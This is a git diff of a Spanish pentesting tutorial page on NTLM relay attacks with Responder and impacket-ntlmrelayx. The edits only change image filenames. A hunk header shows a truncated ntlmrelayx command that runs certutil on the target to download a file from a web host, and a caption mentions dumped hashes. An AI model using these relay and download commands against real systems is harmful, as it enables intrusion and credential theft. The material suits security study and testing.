@@ -10,11 +10,11 @@ Este ataque consiste en capturar los hashes Net-NTLM de un cliente, reenviarlos 
 
 Para poder hacer el relaying el cliente del que capturemos los hashes Net-NTLM deberá pertenecer al grupo local de administradores sobre el cual vamos a querer ejecutar comandos y que el SMB signing esté desactivado.
 
-<figure><img src="../../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
 **/usr/share/responder/Responder.Conf:**
 
-![](<../../../.gitbook/assets/image (31).png>)
+![](<../../../.gitbook/assets/image (27).png>)
 
 
 
@@ -40,9 +40,9 @@ impacket-ntlmrelayx -t 192.168.0.110 -c "certutil.exe -f -urlcache -split http:/
 
 Cliente 1 con privilegios de administrador en el cliente 2:
 
-<figure><img src="../../../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>
 
 Hashes dumpeados con ntlmrelayx
 
-<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (113).png" alt=""><figcaption></figcaption></figure>
 
